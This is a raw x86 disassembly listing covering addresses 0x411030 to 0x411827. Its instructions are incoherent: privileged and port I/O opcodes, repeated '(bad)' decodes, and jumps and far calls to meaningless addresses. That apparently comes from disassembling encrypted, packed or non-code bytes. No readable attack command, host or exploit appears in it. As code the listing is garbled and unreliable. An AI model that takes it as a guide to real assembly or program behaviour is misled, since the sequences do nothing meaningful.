  411030:	jmp    edi
  411032:	bound  ebx,QWORD PTR [ecx-0x55]
  411035:	push   ebp
  411036:	sbb    ebx,eax
  411038:	fstp   TBYTE PTR [edx-0x29522e48]
  41103e:	sub    al,0x2e
  411040:	sahf   
  411041:	cmp    esp,ebp
  411043:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411044:	mov    esi,0x32adbe64
  411049:	ins    DWORD PTR es:[edi],dx
  41104a:	sbb    eax,0x646a9c4d
  41104f:	pop    edi
  411050:	je     0x411030
  411052:	inc    ebp
  411053:	je     0x411023
  411055:	enter  0xb919,0xf0
  411059:	out    0x2e,eax
  41105b:	mov    ch,0xa
  41105d:	cmp    al,0xbd
  41105f:	lock bswap esp
  411062:	or     BYTE PTR [edx],ch
  411064:	rep lods eax,DWORD PTR ds:[esi]
  411066:	sub    ebx,DWORD PTR [edi]
  411068:	clc    
  411069:	push   esp
  41106a:	arpl   WORD PTR [ecx+edx*2+0xb],dx
  41106e:	fmul   DWORD PTR [ecx+0x33]
  411071:	push   ds
  411072:	push   cs
  411073:	sub    eax,DWORD PTR [edx]
  411075:	pop    esi
  411076:	mul    BYTE PTR [eax-0x48]
  411079:	repz jp 0x4110ea
  41107c:	push   es
  41107d:	and    DWORD PTR [ecx+0x6cb16e64],ebp
  411083:	mov    bl,0x6f
  411085:	in     eax,0x7e
  411087:	inc    esp
  411088:	mov    eax,ds:0xea1846d5
  41108d:	jmp    0x4110e5
  41108f:	sub    esp,DWORD PTR [edi]
  411091:	xchg   edi,eax
  411092:	xor    esp,DWORD PTR ds:0x6582e600
  411098:	mov    al,0xb9
  41109a:	jmp    0x33149c0a
  41109f:	and    ebx,esp
  4110a1:	jmp    0x411093
  4110a3:	jle    0x4110f8
  4110a5:	mov    cl,0x75
  4110a7:	and    DWORD PTR [ebp-0x19ad1240],eax
  4110ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110ae:	mov    edi,0xfdc5d069
  4110b3:	(bad)  
  4110b4:	test   eax,0xb707bce6
  4110b9:	jecxz  0x4110ed
  4110bb:	test   edx,eax
  4110bd:	add    DWORD PTR [edi+0x1a],edi
  4110c0:	cld    
  4110c1:	cli    
  4110c2:	test   eax,0xa9326ca2
  4110c7:	ja     0x4110eb
  4110c9:	or     ebx,DWORD PTR [edi-0x1d39fcf7]
  4110cf:	jne    0x41111e
  4110d1:	cwde   
  4110d2:	push   edx
  4110d3:	pop    edi
  4110d4:	inc    eax
  4110d5:	mov    ecx,cr4
  4110d8:	psllq  mm0,mm6
  4110db:	iret   
  4110dc:	cmp    BYTE PTR [eax+0x73],ch
  4110df:	sti    
  4110e0:	pop    edi
  4110e1:	out    dx,al
  4110e2:	fsubr  st(5),st
  4110e4:	ret    0x9e9b
  4110e7:	gs pop es
  4110e9:	jle    0x4110b0
  4110eb:	cmp    edx,ecx
  4110ed:	loopne 0x411153
  4110ef:	aaa    
  4110f0:	cmp    esp,edi
  4110f2:	mov    al,0x6b
  4110f4:	sub    DWORD PTR [ecx-0x604aa77c],ebx
  4110fa:	xor    al,BYTE PTR [esi-0x6f]
  4110fd:	sub    al,0xd
  4110ff:	pop    esp
  411100:	xor    DWORD PTR [edi+0x44],ebx
  411103:	xchg   di,ax
  411105:	aad    0x5b
  411107:	pop    ds
  411108:	rol    BYTE PTR gs:[edi],cl
  41110b:	(bad)  
  41110c:	int    0x46
  41110e:	ret    0x829b
  411111:	imul   ebx,esp,0x6f3895ed
  411117:	imul   eax,DWORD PTR [ebx+ebx*8],0xd9f54d2e
  41111e:	inc    ebx
  41111f:	ins    BYTE PTR es:[edi],dx
  411120:	lock ror DWORD PTR [edx-0x80],cl
  411124:	inc    esp
  411125:	adc    cl,BYTE PTR [esi]
  411127:	mov    gs,WORD PTR [edx-0x25]
  41112a:	mov    eax,0x1fb1c7dd
  41112f:	popf   
  411130:	daa    
  411131:	xchg   edx,eax
  411132:	es or  edx,0x1347c474
  411139:	sti    
  41113a:	mov    dh,0x1c
  41113c:	mov    ds:0xdcac6bf,al
  411141:	push   0x4466c4b7
  411146:	adc    BYTE PTR [edx+0x3ecedc2c],dh
  41114c:	xor    eax,0x32b5abe7
  411151:	loopne 0x4111ca
  411153:	stos   DWORD PTR es:[edi],eax
  411154:	pop    ebp
  411155:	add    al,0x42
  411157:	ret    
  411158:	sbb    BYTE PTR [edx-0x4d5cc6f9],bh
  41115e:	push   ebp
  41115f:	xchg   DWORD PTR ds:0x3d10ce1b,ebp
  411165:	call   0x1bdf:0x674103e3
  41116c:	or     eax,0x77202a52
  411171:	inc    ebx
  411172:	or     eax,0x80c32f63
  411177:	mov    bl,0x2e
  411179:	(bad)  
  41117a:	ja     0x4111a6
  41117c:	sbb    eax,0x8c6e710e
  411181:	or     dh,BYTE PTR [edx]
  411183:	adc    eax,0x3cb25ac7
  411188:	cwde   
  411189:	ja     0x411150
  41118b:	jmp    0x411167
  41118d:	fwait
  41118e:	jno    0x411115
  411190:	sbb    ah,0x12
  411193:	sbb    DWORD PTR [ebp+ebx*1-0x57],0xd221d801
  41119b:	mov    ds:0x832cac25,eax
  4111a0:	adc    edi,ebx
  4111a2:	mov    ebp,0x32167c92
  4111a7:	hlt    
  4111a8:	and    esi,DWORD PTR [edx]
  4111aa:	(bad)
  4111af:	into   
  4111b0:	daa    
  4111b1:	imul   ebp,DWORD PTR [ebx+0x16],0x88d59501
  4111b8:	sub    DWORD PTR [eax],esi
  4111ba:	imul   edx,DWORD PTR [ebp-0x6ddc9eab],0x89705379
  4111c4:	and    eax,0x19f753c0
  4111c9:	push   edx
  4111ca:	inc    edx
  4111cb:	mov    ecx,0x1bc5336b
  4111d0:	add    bl,BYTE PTR [eax+0x10bbd3e2]
  4111d6:	call   0xaabd437c
  4111db:	div    DWORD PTR [edx+ebp*1]
  4111de:	xor    eax,0x6d681b1a
  4111e3:	mov    eax,0x65c3452e
  4111e8:	mov    cl,BYTE PTR [eax]
  4111ea:	ds pop ds
  4111ec:	(bad)
  4111ef:	aam    0x15
  4111f1:	dec    ebp
  4111f2:	jb     0x4111dc
  4111f4:	fucomip st,st(7)
  4111f6:	xor    DWORD PTR [edi+0x70],edx
  4111f9:	cmp    eax,DWORD PTR [edx+eiz*4+0x76]
  4111fd:	sub    eax,0x33b9c89b
  411202:	int3   
  411203:	inc    edx
  411204:	dec    ecx
  411205:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411206:	out    dx,al
  411207:	pushf  
  411208:	mov    dh,0x90
  41120a:	lods   eax,DWORD PTR ds:[esi]
  41120b:	mov    ebx,0x747a0fca
  411210:	pushf  
  411211:	and    BYTE PTR [ebx+esi*8-0x34],al
  411215:	pop    edi
  411216:	les    ebx,FWORD PTR [edi+0x35]
  411219:	or     BYTE PTR fs:[eax-0x45],bh
  41121d:	cmc    
  41121e:	ret    0xf384
  411221:	pop    esp
  411222:	aas    
  411223:	jne    0x411201
  411225:	pop    esi
  411226:	mov    cl,BYTE PTR [edi+0x53]
  411229:	push   ds
  41122a:	das    
  41122b:	or     BYTE PTR [eax+0x53be019f],cl
  411231:	outs   dx,BYTE PTR ds:[esi]
  411232:	test   BYTE PTR [esi-0x15],al
  411235:	or     ch,dl
  411237:	mov    dh,0xc9
  411239:	sahf   
  41123a:	movq   mm4,mm4
  41123d:	dec    esp
  41123e:	sti    
  41123f:	std    
  411240:	test   al,0x25
  411242:	sar    BYTE PTR [esi+ebp*4-0x1c],cl
  411246:	mov    ch,0x4a
  411248:	pop    edi
  411249:	mov    al,ds:0xf2a1f9ae
  41124e:	pushf  
  41124f:	sub    eax,0xae6ffaac
  411254:	push   ds
  411255:	inc    esi
  411256:	rol    DWORD PTR ds:0x8866014f,0xc5
  41125d:	xchg   esp,eax
  41125e:	pusha  
  41125f:	xchg   BYTE PTR [eax*2+0x5aa272f2],bl
  411266:	loop   0x4112e6
  411268:	shr    edi,1
  41126a:	clc    
  41126b:	and    eax,0x150db219
  411270:	lahf   
  411271:	jo     0x411223
  411273:	data16 (bad) 
  411275:	aad    0x76
  411277:	ins    DWORD PTR es:[edi],dx
  411278:	data16 add BYTE PTR [esi+0x3da27121],bh
  41127f:	mov    ecx,DWORD PTR [ecx-0x55]
  411282:	aaa    
  411283:	xor    BYTE PTR [ecx-0x61469591],dh
  411289:	adc    eax,0x6ff889b0
  41128e:	inc    edx
  41128f:	jge    0x4112e2
  411291:	imul   edi,DWORD PTR fs:[edi],0xfffffff4
  411295:	dec    edi
  411296:	not    ebp
  411298:	dec    ebp
  411299:	pop    ss
  41129a:	js     0x411311
  41129c:	shl    DWORD PTR [esi],0x25
  41129f:	lock or al,0xc5
  4112a2:	dec    ebp
  4112a3:	inc    ebp
  4112a4:	xchg   BYTE PTR [ecx-0x7aecf3a0],cl
  4112aa:	popa   
  4112ab:	push   esi
  4112ac:	dec    ecx
  4112ad:	add    dl,BYTE PTR es:[esi+0x69b6e7b0]
  4112b4:	imul   ebx,esp,0xffffff9f
  4112b7:	rcr    BYTE PTR [ebx],cl
  4112b9:	jecxz  0x4112c4
  4112bb:	retf   
  4112bc:	dec    edx
  4112bd:	popa   
  4112be:	lods   eax,DWORD PTR ds:[esi]
  4112bf:	call   0x93eb:0xe20ecd5e
  4112c6:	mov    ah,0xae
  4112c8:	cs ja  0x411324
  4112cb:	push   ebp
  4112cc:	add    esp,esi
  4112ce:	sub    BYTE PTR [ebx-0x2071421d],dl
  4112d4:	push   edi
  4112d5:	push   0x9a7998d1
  4112da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112db:	push   0x59bdf8cb
  4112e0:	adc    eax,0x4204b8ef
  4112e5:	cmp    DWORD PTR [edi+0x7d],edi
  4112e8:	lahf   
  4112e9:	popa   
  4112ea:	fld    TBYTE PTR [ebx]
  4112ec:	adc    edx,DWORD PTR [edi-0x1c76c112]
  4112f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112f3:	sbb    bl,BYTE PTR [esi+0x30]
  4112f6:	arpl   bx,dx
  4112f8:	add    ebx,edx
  4112fa:	in     eax,0xac
  4112fc:	push   edi
  4112fd:	jb     0x4112a9
  4112ff:	(bad)  
  411301:	dec    esi
  411302:	adc    esp,DWORD PTR ds:0x82d7f06f
  411308:	mov    ecx,0xa4b8a473
  41130d:	cli    
  41130e:	xlat   BYTE PTR ds:[ebx]
  41130f:	hlt    
  411310:	sub    esp,DWORD PTR [ebp+edi*1+0x51]
  411314:	and    al,BYTE PTR [ebx+0x4e]
  411317:	scas   al,BYTE PTR es:[edi]
  411318:	shl    DWORD PTR ds:0x20bb1aee,0xf7
  41131f:	add    eax,DWORD PTR [eax]
  411321:	sbb    DWORD PTR [esi+0x51672e29],esi
  411327:	xor    bh,BYTE PTR [esp+ecx*2]
  41132a:	cmp    BYTE PTR [ecx],0x7b
  41132d:	mov    ecx,0xd0e58e7d
  411332:	add    dl,bl
  411334:	sub    DWORD PTR [esi+0x2c],0xfdde86a2
  41133b:	sub    bl,BYTE PTR [edx]
  41133d:	xor    al,0xb5
  41133f:	les    ebx,FWORD PTR [esi-0x5b239eb8]
  411345:	out    0x9e,eax
  411347:	ret    0x4b68
  41134a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41134b:	mov    bl,0x47
  41134d:	inc    ebx
  41134e:	shl    esp,1
  411350:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411351:	mov    ds:0x3289801d,al
  411356:	inc    ebp
  411357:	pushf  
  411358:	stos   DWORD PTR es:[edi],eax
  411359:	mov    dl,0xb
  41135b:	popa   
  41135c:	mov    ah,ch
  41135e:	dec    esi
  41135f:	mov    ?,WORD PTR [ecx+0x36]
  411362:	inc    esp
  411363:	sbb    BYTE PTR [ebx],dh
  411365:	arpl   WORD PTR [ebp+ebx*1+0x4a6843bb],ax
  41136c:	xor    ebx,edi
  41136e:	xor    esp,eax
  411370:	sbb    eax,0x2ca42bf7
  411375:	xchg   ebp,eax
  411376:	mov    edi,0x13170f83
  41137b:	xchg   ecx,eax
  41137c:	jmp    0xffb2ab58
  411381:	arpl   WORD PTR [edx-0x15],di
  411384:	adc    bh,dl
  411386:	mov    al,BYTE PTR [esi+0x31e11a35]
  41138c:	sub    eax,0x37f31840
  411391:	pop    eax
  411392:	xchg   DWORD PTR [ebx+edx*8+0x4d],edi
  411396:	enter  0x33b7,0xae
  41139a:	pop    ds
  41139b:	xchg   esi,eax
  41139c:	xor    dl,BYTE PTR [ebp-0x52]
  41139f:	out    0x15,al
  4113a1:	scas   eax,DWORD PTR es:[edi]
  4113a2:	inc    edi
  4113a3:	push   esp
  4113a4:	repz cmp eax,0xb3b3acad
  4113aa:	push   edi
  4113ab:	lahf   
  4113ac:	push   edx
  4113ad:	hlt    
  4113ae:	aam    0xcd
  4113b0:	pop    edx
  4113b1:	lea    edx,[esi]
  4113b3:	mov    ds:0x4d4c7e63,al
  4113b8:	inc    esp
  4113b9:	es mov esi,0x48b4315d
  4113bf:	sbb    eax,0x4582732b
  4113c4:	jns    0x411394
  4113c6:	or     edi,DWORD PTR [ebp+0x6]
  4113c9:	sbb    BYTE PTR [ebp-0x5a4cf759],0xda
  4113d0:	nop
  4113d1:	adc    ah,0x40
  4113d4:	xor    DWORD PTR [esi-0xd],esp
  4113d7:	xchg   ax,ax
  4113d9:	pusha  
  4113da:	jge    0x4113bc
  4113dc:	push   esp
  4113dd:	call   0x86c4f050
  4113e2:	push   esp
  4113e3:	cmc    
  4113e4:	out    0x8f,eax
  4113e6:	pop    edi
  4113e7:	adc    ebx,0x45
  4113ea:	pop    ebx
  4113eb:	loop   0x4113bd
  4113ed:	xchg   DWORD PTR [edx+0x2b],esi
  4113f0:	pusha  
  4113f1:	dec    ecx
  4113f2:	jne    0x4113a0
  4113f4:	gs and al,0xc4
  4113f7:	pop    ecx
  4113f8:	das    
  4113f9:	mov    ebp,edi
  4113fb:	aaa    
  4113fc:	out    0x68,eax
  4113fe:	or     ch,BYTE PTR [edi]
  411400:	push   ebp
  411401:	adc    eax,0x794c1dd7
  411406:	mov    bh,0x30
  411408:	lds    edx,FWORD PTR [edx+0x6e]
  41140b:	sbb    eax,DWORD PTR cs:[ebp+0x7a]
  41140f:	fnsave [ebp+0x31]
  411412:	sbb    eax,0xcddda5c5
  411417:	(bad)  
  411418:	loop   0x4113b3
  41141a:	xchg   esi,eax
  41141b:	mov    ecx,0xd42ce84
  411420:	dec    edi
  411421:	hlt    
  411422:	or     bl,BYTE PTR [edx+ebx*8+0x4a]
  411426:	jne    0x411428
  411428:	mov    ds:0x397238d8,eax
  41142d:	(bad)  
  41142f:	out    dx,al
  411430:	pusha  
  411431:	shl    BYTE PTR [eax],1
  411433:	jle    0x411408
  411435:	(bad)  
  411436:	fdiv   st,st(4)
  411438:	xor    bh,ah
  41143a:	sub    ebx,DWORD PTR ds:0xdbe8a92b
  411440:	inc    ebx
  411441:	jecxz  0x41141b
  411443:	push   eax
  411444:	outs   dx,DWORD PTR ds:[esi]
  411445:	test   DWORD PTR [bx+si],ebp
  411448:	lds    ebp,FWORD PTR [eax]
  41144a:	in     eax,0xac
  41144c:	leave  
  41144d:	push   ebx
  41144e:	repnz and DWORD PTR [ebx+0x16e6b285],esp
  411455:	or     al,0x8a
  411457:	pop    eax
  411458:	stc    
  411459:	add    eax,0xb1d6fb85
  41145e:	adc    al,0x27
  411460:	or     cl,0xba
  411463:	aad    0x8f
  411465:	dec    esp
  411466:	or     DWORD PTR [esi+0x3a],ecx
  411469:	fsubr  DWORD PTR [edi-0x34]
  41146c:	push   0xd2ead5ee
  411471:	scas   eax,DWORD PTR es:[edi]
  411472:	popa   
  411473:	mov    eax,esi
  411475:	dec    edx
  411476:	jle    0x4114d8
  411478:	xchg   edx,eax
  411479:	inc    eax
  41147a:	push   eax
  41147b:	dec    esi
  41147c:	mov    WORD PTR [edi+0x74],es
  41147f:	mov    ebp,0x1db890bd
  411484:	sub    BYTE PTR [ecx+0x25bb166f],dh
  41148a:	inc    ecx
  41148b:	ror    DWORD PTR [esi+0x10],1
  41148e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41148f:	add    al,BYTE PTR [ebx+0x1c14197d]
  411495:	pop    edx
  411496:	cli    
  411497:	scas   eax,DWORD PTR es:[edi]
  411498:	xchg   esi,eax
  411499:	add    al,BYTE PTR [esp+esi*1+0x1a0b4168]
  4114a0:	mov    ebp,0x68d2ab93
  4114a5:	mov    ah,0x26
  4114a7:	dec    ebp
  4114a8:	and    dl,al
  4114aa:	jae    0x4114ca
  4114ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114ad:	in     al,dx
  4114ae:	inc    edi
  4114af:	imul   eax,DWORD PTR [esp+eiz*4-0x3c],0xffffffb3
  4114b4:	imul   esp,DWORD PTR [ebx-0x4e249286],0xfffffff2
  4114bb:	in     al,dx
  4114bc:	popa   
  4114bd:	adc    eax,0x2accbb3b
  4114c2:	in     eax,0xdb
  4114c4:	and    edi,DWORD PTR [esi+ecx*1-0x1a]
  4114c8:	in     eax,dx
  4114c9:	xor    al,BYTE PTR fs:[esi]
  4114cc:	call   0xfc43ada0
  4114d1:	and    eax,0xcde94cb3
  4114d6:	mov    al,ds:0x4e285049
  4114db:	dec    edx
  4114dc:	scas   eax,DWORD PTR es:[edi]
  4114dd:	(bad)
  4114e2:	push   0x925989af
  4114e7:	ret    
  4114e8:	bswap  ebp
  4114ea:	cdq    
  4114eb:	mov    ebp,0x4e0a9e1c
  4114f1:	xor    al,0xf6
  4114f3:	dec    eax
  4114f4:	leave  
  4114f5:	call   0xbe84daf0
  4114fa:	cmp    dh,BYTE PTR [esi]
  4114fc:	or     BYTE PTR [edx-0x246b00ef],dh
  411502:	or     ah,BYTE PTR [ebx+0x11346d8c]
  411508:	pop    ecx
  411509:	mov    ebp,DWORD PTR [esi]
  41150b:	mov    ebx,0x39ca59b8
  411510:	ja     0x4114cb
  411512:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411513:	sti    
  411514:	stos   DWORD PTR es:[edi],eax
  411515:	pop    edi
  411516:	into   
  411517:	test   al,0xdf
  411519:	mov    al,0x8e
  41151b:	mov    bl,0x91
  41151d:	lahf   
  41151e:	cwde   
  41151f:	or     DWORD PTR [ebx-0x557c632e],edi
  411525:	mov    edx,0x7108d6e5
  41152a:	push   cs
  41152b:	mov    edi,0x56374ab6
  411530:	add    DWORD PTR [eax+0x78],0x456d7b7e
  411537:	ins    DWORD PTR es:[edi],dx
  411538:	hlt    
  411539:	cmp    BYTE PTR [edx-0x1671dae4],al
  41153f:	outs   dx,DWORD PTR ds:[esi]
  411540:	push   0xffffffd4
  411542:	sbb    DWORD PTR [esi-0x1],esp
  411545:	(bad)  
  411546:	pushf  
  411547:	xor    ebp,DWORD PTR [esi-0x7a]
  41154a:	test   eax,0xc1b5b7d5
  41154f:	dec    edx
  411550:	sbb    cl,ch
  411552:	aas    
  411553:	mov    ecx,0xfb20ea78
  411558:	mov    WORD PTR [ecx],?
  41155a:	ins    BYTE PTR es:[edi],dx
  41155b:	sbb    ah,BYTE PTR [ebp+0x2fa95859]
  411561:	push   es
  411562:	push   ss
  411563:	mov    bh,0xc1
  411565:	pop    edi
  411566:	in     eax,0xec
  411568:	mov    ds:0x9e816500,al
  41156d:	adc    DWORD PTR [ebx],eax
  41156f:	sub    DWORD PTR [edx],ebx
  411571:	test   BYTE PTR [edx+ebp*2+0x2ecd64dd],bh
  411578:	sbb    ah,BYTE PTR [edi+0x6561f82]
  41157e:	cli    
  41157f:	inc    esi
  411580:	sbb    BYTE PTR [ecx+0x145379fb],bl
  411586:	(bad)  
  411587:	aam    0xad
  411589:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41158a:	bnd jp 0x4115b1
  41158d:	(bad)  
  41158e:	xchg   di,ax
  411590:	mov    edx,0xf92567d1
  411595:	and    dh,al
  411597:	push   edx
  411598:	aad    0x97
  41159a:	push   ds
  41159b:	inc    ebx
  41159c:	pop    esi
  41159d:	test   eax,0x3b779e8d
  4115a2:	in     al,dx
  4115a3:	iret   
  4115a4:	stos   DWORD PTR es:[edi],eax
  4115a5:	cmp    edi,DWORD PTR [ebx]
  4115a7:	in     eax,dx
  4115a8:	push   ecx
  4115a9:	in     al,0xf9
  4115ab:	xor    DWORD PTR [ecx-0x71],edx
  4115ae:	jnp    0x4115e2
  4115b0:	(bad)  
  4115b1:	shr    DWORD PTR [ebp+0x6f4b673f],1
  4115b7:	sahf   
  4115b8:	pushf  
  4115b9:	ror    DWORD PTR [esi-0x5e44fd5b],cl
  4115bf:	jge    0x411638
  4115c1:	test   BYTE PTR [edx],0x81
  4115c4:	mov    eax,ds:0x239116bd
  4115c9:	cld    
  4115ca:	lea    ecx,[eax+0x50ea7c27]
  4115d0:	sub    dh,BYTE PTR [ebp+0x53]
  4115d3:	leave  
  4115d4:	lahf   
  4115d5:	mov    esp,0x69fe13eb
  4115da:	cmp    al,0x86
  4115dc:	add    edx,DWORD PTR [ecx+0x3e]
  4115df:	sbb    BYTE PTR [eax+0x3874cd84],cl
  4115e5:	repnz push edx
  4115e7:	out    0xe9,al
  4115e9:	cmp    ebx,esi
  4115eb:	or     BYTE PTR [ebp+ebp*2+0x6],dl
  4115ef:	cmp    DWORD PTR [esi],edx
  4115f1:	or     eax,0xed7b0b64
  4115f6:	inc    eax
  4115f7:	mov    ?,WORD PTR [edi-0x1e]
  4115fa:	push   esi
  4115fb:	xchg   DWORD PTR [ecx+ebx*4-0x2d],eax
  4115ff:	mov    eax,0x6cb3f4ba
  411604:	adc    al,0x7
  411606:	pop    eax
  411607:	ja     0x411676
  411609:	mov    edx,0xd6f6d3ad
  41160e:	jnp    0x41167d
  411610:	(bad)  
  411611:	imul   eax,DWORD PTR [esi+ebp*2+0x54],0x4e190386
  411619:	pop    ebp
  41161a:	push   eax
  41161b:	pop    es
  41161c:	daa    
  41161d:	mov    dh,0xea
  41161f:	sub    al,BYTE PTR [ebx]
  411621:	mov    ecx,0x1b1ee853
  411626:	in     al,0xd
  411628:	inc    esp
  411629:	cmp    BYTE PTR [eax-0x1b16f573],ch
  41162f:	mov    eax,DWORD PTR [ebp-0x15334867]
  411635:	lock inc esp
  411637:	or     al,0x83
  411639:	add    al,0x55
  41163b:	sar    edx,0x91
  41163e:	sub    eax,0xec402f3e
  411643:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411644:	test   al,0x6
  411646:	xchg   ebp,eax
  411647:	or     BYTE PTR [ebp+ebp*8+0x2a566d5d],bl
  41164e:	add    ebx,DWORD PTR [ebp+edx*8+0x7f]
  411652:	and    dh,ch
  411654:	gs pushf 
  411656:	adc    BYTE PTR [ebp-0x374a67b8],al
  41165c:	nop
  41165d:	adc    ebp,DWORD PTR [esp+eax*2-0x54aa4c9]
  411664:	jp     0x4116ad
  411666:	jl     0x4116b7
  411668:	repnz cmp al,0x96
  41166b:	out    0x83,al
  41166d:	xor    bh,dl
  41166f:	mov    bh,0x70
  411671:	call   0x569b7649
  411676:	mov    ds:0x7d9804f7,eax
  41167b:	xchg   esp,eax
  41167c:	push   cs
  41167d:	icebp  
  41167e:	data16 into 
  411680:	clc    
  411681:	pushf  
  411682:	adc    al,0xbd
  411684:	mov    eax,ds:0x2d9561c0
  411689:	test   esi,ebp
  41168b:	pop    ebp
  41168c:	jg     0x4116f0
  41168e:	or     BYTE PTR [esi+edx*4],ch
  411691:	pop    ecx
  411692:	xchg   edx,eax
  411693:	mov    gs:0x26345ff0,eax
  411699:	call   0x9276bd42
  41169e:	mov    ecx,0xcf60ed21
  4116a3:	jmp    0x411625
  4116a5:	loopne 0x411668
  4116a7:	push   ecx
  4116a8:	jmp    0xdba421aa
  4116ad:	bound  edx,QWORD PTR [ecx+0x51]
  4116b0:	sub    BYTE PTR [ebx+esi*8+0x33],ah
  4116b4:	jp     0x411690
  4116b6:	popa   
  4116b7:	pop    esi
  4116b8:	daa    
  4116b9:	push   ebx
  4116ba:	cmp    BYTE PTR [esi-0x7f],dl
  4116bd:	fisub  WORD PTR [edx-0x6e9d3533]
  4116c3:	dec    edi
  4116c4:	xchg   ebp,eax
  4116c5:	enter  0x280c,0x4f
  4116c9:	sbb    ah,dl
  4116cb:	xchg   BYTE PTR ds:0xa2c2a9fd,ch
  4116d1:	mov    WORD PTR ss:[eax],gs
  4116d4:	xchg   ecx,eax
  4116d5:	inc    esi
  4116d6:	jp     0x41172a
  4116d8:	aas    
  4116d9:	lahf   
  4116da:	jmp    DWORD PTR [edx]
  4116dc:	mov    eax,0xfe4d870d
  4116e1:	out    dx,al
  4116e2:	add    al,0x59
  4116e4:	mov    gs,edx
  4116e6:	clc    
  4116e7:	repnz xlat BYTE PTR ds:[ebx]
  4116e9:	mov    edx,0x386214a1
  4116ee:	xor    esp,esi
  4116f0:	into   
  4116f1:	fs aaa 
  4116f3:	dec    eax
  4116f4:	into   
  4116f5:	(bad)  [ecx]
  4116f7:	fld    TBYTE PTR [esi+0x69bcbe02]
  4116fd:	sti    
  4116fe:	pop    esi
  4116ff:	cmp    al,0x7
  411701:	xchg   ebp,eax
  411702:	dec    esp
  411703:	out    0x91,eax
  411705:	lods   al,BYTE PTR ds:[esi]
  411706:	mov    eax,0x94324b73
  41170b:	mov    eax,ds:0xcddc9850
  411710:	pop    DWORD PTR [ecx+0x2c71d5dd]
  411716:	pop    esp
  411717:	loop   0x4116a1
  411719:	ret    0xf571
  41171c:	cdq    
  41171d:	mov    dl,0xb7
  41171f:	xor    al,0x67
  411721:	mov    esp,0xd4467f9
  411726:	mov    bh,0x8d
  411728:	ficomp DWORD PTR [ebp+0x278ca1f]
  41172e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41172f:	out    dx,eax
  411730:	fidiv  DWORD PTR [edx+0x588ef9d4]
  411736:	gs pop esp
  411738:	jne    0x4116d5
  41173a:	mov    edx,0xedca9601
  41173f:	pop    esp
  411740:	sbb    cl,BYTE PTR [eax]
  411742:	fldcw  WORD PTR [ebp+0x1e]
  411745:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411746:	mov    al,0x5d
  411748:	mov    esp,0xd24340a
  41174d:	add    esp,esi
  41174f:	in     al,0x3f
  411751:	neg    bh
  411753:	arpl   WORD PTR [esi+0x1af28e87],cx
  411759:	mov    al,0x62
  41175b:	jle    0x4117ba
  41175d:	adc    BYTE PTR [eax],bl
  41175f:	inc    edi
  411760:	fwait
  411761:	dec    esi
  411762:	mov    ebp,0xb713007f
  411767:	adc    edx,edi
  411769:	push   edi
  41176a:	pop    edx
  41176b:	into   
  41176c:	push   eax
  41176d:	je     0x4117a7
  41176f:	ret    0x38c5
  411772:	in     eax,dx
  411773:	(bad)  
  411774:	jle    0x411781
  411776:	push   ds
  411777:	imul   edx,DWORD PTR [ebx+ebx*4-0x46],0xcf010345
  41177f:	out    0xf3,al
  411781:	xor    BYTE PTR [edx+0x2f],ch
  411784:	out    dx,eax
  411785:	jb     0x41176b
  411787:	leave  
  411788:	div    DWORD PTR [edx+0x64]
  41178b:	jno    0x4117f6
  41178d:	mov    DWORD PTR [ebx-0xd],ebx
  411790:	ss jns 0x411768
  411793:	mov    dh,0xf5
  411795:	and    DWORD PTR [ecx+0x22],0xfffffffc
  411799:	dec    ecx
  41179a:	sbb    eax,0x25e926e9
  41179f:	and    DWORD PTR [esi+0x26],eax
  4117a2:	clc    
  4117a3:	xchg   ebx,eax
  4117a4:	hlt    
  4117a5:	fist   WORD PTR [ecx+0x6b]
  4117a8:	(bad)  
  4117a9:	je     0x4117e4
  4117ab:	outs   dx,DWORD PTR ds:[esi]
  4117ac:	lods   al,BYTE PTR ds:[esi]
  4117ad:	sub    al,BYTE PTR [ecx+0x7a738d87]
  4117b3:	add    DWORD PTR [ebx+0x12],esp
  4117b6:	sub    BYTE PTR [ebx-0x40],bh
  4117b9:	lock jno 0x4117a9
  4117bc:	ret    0x7928
  4117bf:	fwait
  4117c0:	xor    al,0xe7
  4117c2:	outs   dx,DWORD PTR ds:[esi]
  4117c3:	add    eax,0x290adaf6
  4117c8:	and    ebx,DWORD PTR [edi]
  4117ca:	jns    0x41176c
  4117cc:	jo     0x411839
  4117ce:	cmp    DWORD PTR [ebp+0x63],edi
  4117d1:	mov    ds:0x67783d88,al
  4117d6:	push   ds
  4117d7:	xchg   BYTE PTR [ebx-0x58],bl
  4117da:	or     al,0x70
  4117dc:	idiv   DWORD PTR [eax]
  4117de:	rcl    BYTE PTR cs:[ebx],1
  4117e1:	leave  
  4117e2:	pop    edi
  4117e3:	scas   al,BYTE PTR es:[edi]
  4117e4:	mov    bl,0x2b
  4117e6:	xchg   esi,eax
  4117e7:	pop    eax
  4117e8:	mov    esi,0xa012244a
  4117ed:	or     eax,DWORD PTR [ecx+0x2f]
  4117f0:	ret    
  4117f1:	mov    dh,0x23
  4117f3:	mov    ds:0x7dee57bc,eax
  4117f8:	sahf   
  4117f9:	or     ebx,ecx
  4117fb:	sbb    BYTE PTR [ebp-0xc7f0c37],dh
  411801:	out    dx,eax
  411802:	fcomip st,st(1)
  411804:	ror    BYTE PTR [ebp-0x474e60ba],1
  41180a:	push   cs
  41180b:	inc    edx
  41180c:	pop    ss
  41180d:	inc    esi
  41180e:	in     eax,dx
  41180f:	cmp    dh,BYTE PTR [esi+0x77]
  411812:	jb     0x411813
  411814:	pop    edi
  411815:	jbe    0x411818
  411817:	or     al,0xce
  411819:	sar    DWORD PTR [ecx+0x2806be7b],0xba
  411820:	neg    BYTE PTR [ebx]
  411822:	stc    
  411823:	out    0x4c,al
  411825:	adc    al,0x81
  411827:	lods   al,BYTE PTR ds:[esi]
